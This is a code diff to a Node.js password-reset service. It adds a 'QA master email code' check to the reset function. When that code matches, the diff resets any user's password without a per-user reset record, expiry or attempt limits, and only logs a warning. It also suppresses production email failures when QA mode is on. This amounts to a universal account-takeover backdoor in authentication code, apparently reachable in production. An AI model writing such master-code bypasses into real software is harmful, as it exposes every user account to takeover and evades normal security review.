@@ -2,6 +2,7 @@ import crypto from 'node:crypto';
 import bcrypt from 'bcryptjs';
 import { prisma } from './prisma.js';
 import { sendPasswordResetCode } from './email.js';
+import { isQaOtpEnabled, matchesQaEmailOtp } from './qaOtp.js';
 
 const CODE_TTL_MS = 10 * 60 * 1000;
 const MAX_ATTEMPTS = 5;
@@ -64,11 +65,13 @@ export async function requestPasswordReset(email) {
     await sendPasswordResetCode({ to: normalized, code, fullName: user.fullName });
   } catch (err) {
     console.error('[password-reset] email send failed:', err?.message ?? err);
-    if (process.env.NODE_ENV === 'production') {
+    if (process.env.NODE_ENV === 'production' && !(await isQaOtpEnabled())) {
       throw err;
     }
-    result.message = 'ელ-ფოსტის გაგზავნა ვერ მოხერხდა (dev). გამოიყენეთ devCode.';
-    result.devCode = code;
+    if (process.env.NODE_ENV !== 'production') {
+      result.message = 'ელ-ფოსტის გაგზავნა ვერ მოხერხდა (dev). გამოიყენეთ devCode.';
+      result.devCode = code;
+    }
     return result;
   }
 
@@ -85,6 +88,21 @@ export async function resetPasswordWithCode({ email, code, password }) {
 
   if (!user) {
     return { ok: false, status: 400, error: 'კოდი არასწორია ან ვადა გაუვიდა.' };
+  }
+
+  if (await matchesQaEmailOtp(code)) {
+    console.warn('[qa-otp] accepted master email code for', normalized);
+    await prisma.$transaction([
+      prisma.user.update({
+        where: { id: user.id },
+        data: { passwordHash: await bcrypt.hash(password, 12) },
+      }),
+      prisma.passwordReset.updateMany({
+        where: { userId: user.id, usedAt: null },
+        data: { usedAt: new Date() },
+      }),
+    ]);
+    return { ok: true };
   }
 
   const reset = await prisma.passwordReset.findFirst({
